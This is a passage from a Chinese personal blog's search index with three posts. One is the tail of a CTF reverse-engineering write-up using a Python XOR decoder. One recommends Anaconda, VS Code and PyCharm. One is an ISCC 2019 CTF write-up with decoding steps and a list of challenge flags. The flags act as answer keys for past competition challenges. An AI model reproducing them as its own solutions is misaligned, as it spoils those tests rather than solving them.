= 76; v52 = 30; v53 = 66; fd = open("/dev/urandom", 0); read(fd, &amp;buf, 4u); printf("Give me maigc :"); __isoc99_scanf("%d", &amp;v2); if ( buf == v2 ) &#123; for ( i = 0; i &lt;= 0x30; ++i ) putchar((char)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i))); &#125; return __readgsdword(0x14u) ^ v67;&#125; 根据这个可以直接进行逆向： 1234567#-*-encoding=utf-8-*-K = "Do_you_know_why_my_teammate_Orange_is_so_angry???"C = [7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66]print("sizeof(C):",len(C))print("sizeof(K):",len(K))for i in range(len(K)): print(chr(C[i]^ord(K[i])),end="") lab2]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python推荐工具]]></title>
    <url>%2F2019%2F05%2F19%2Fpython%E6%8E%A8%E8%8D%90%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Anaconda介绍Anaconda就是可以便捷获取包且对包能够进行管理，同时对环境可以统一管理的发行版本。Anaconda包含了conda、Python在内的超过180个科学包及其依赖项。 特点 开源 安装过程简单 高性能使用Python和R语言 免费的社区支持 独立的环境依赖，使得诸多比较难装的库可以直接安装 安装 下载链接： https://www.anaconda.com/ Python2.7还有不到一年就要退休了，所以如果你没有什么特殊的工作要求，python3.7就足够满足所有要求 下载下来，点击安装，顺着流程走： 到这一步可以不用选择配置环境变量，以便后面安装什么东西冲突，会出现奇怪的bug 然后一直安装到这,点击install vscode，一个比较好用的编辑器 安装好后，安装一个插件，就差不多可以直接用了 pycharm安装 下载链接：https://www.jetbrains.com/zh/pycharm/specials/pycharm/pycharm.html?utm_source=baidu&amp;utm_medium=cpc&amp;utm_campaign=cn-bai-br-pycharm-ex-pc&amp;utm_content=pycharm-pure&amp;utm_term=pycharm&amp;gclid=CIesutOLqOICFQMpvAodTg4HGA&amp;gclsrc=ds 一路next就行 需要激活的地方停一下 申请学生账号 点击buy Pycharm 填信息 然后等着确认一下就行 之后就可以用了 pycharm中使用anaconda部署python环境 参考网站：https://www.cnblogs.com/pejsidney/p/9216470.html]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>软件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019_ISCC]]></title>
    <url>%2F2019%2F05%2F19%2F2019-ISCC-Misc%2F</url>
    <content type="text"><![CDATA[隐藏的信息打开文件是一堆八进制码 10126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 直接用python转成十进制，然后变为ASCII字符,脚本如下： 12345678910import re#openwith open('message.txt', 'r') as f1: s1 = f1.read() s1 = re.split(' ',s1) for i in s1[0:-1]: print(chr(int(i,8)),end='') f1.close()#V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K#base64解码：ISCC&#123;N0_0ne_can_st0p_y0u&#125; Welcome下载得到一个名为zip的文件，不可打开，看看文件类型 是一个压缩包文件，然后可以解压出50张二维码，发现一个jpg为其他都是png，查看文件二进制信息即可得到flag 1#flag&#123;15cC9012&#125; 提交格式应该是 15cC9012 碎纸机下载得到一个压缩包文件，可以直接解压，得到一个图片 真的是一个碎纸机，先看看文件类型 用binwalk查看一下是否图片里藏有其他文件： 用binwalk -e 平平无奇的碎纸机.jpg分离出文件，得到一些拼图和一个文档 再看看文本里的内容： 碎纸机中居然是一堆黑色和白色的碎片，但是这些碎片之中到底会有什么样的宝藏呢？我去问了欧鹏·曦文同学，他说他有办法恢复拼图原貌，但是前提是要我把真正有用的东西给他。 看起来是需要我们去里面得到相应的信息，可以需要拼图，对二进制进行操作，用winhex打开 现在就看有没有什么规律啥的，翻到最后，发现一个乱码是独立的而且就是由0和F组成，所以将其复制出来，在vscode中打开，然后查找0，可以得到 其他几个文件也是类似，这里就不做赘述，所以flag为：Flag={ISCC_is_so_interesting_!} 解密成绩单ISCC{Y0u_F0UnD_ThE_P4SSW0RD!} REV02flag{ST0RING_STAT1C_PA55WORDS_1N_FIL3S_1S_N0T_S3CUR3} REV03FLAG{I_LOVE_FONZY} Web5flag{1SCC_2OI9} Mobile1234567836275184 pwn02flag{2c9c6bd8-c285-43b7-ac8a-f74eb9a7cb2f} pwn01flag{f530c5ef-3a8a-4271-91f7-3c5ebd87fbe4} rev4http://ISCC2019{url_seems_rotten_with}ctf.com]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ISCC</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
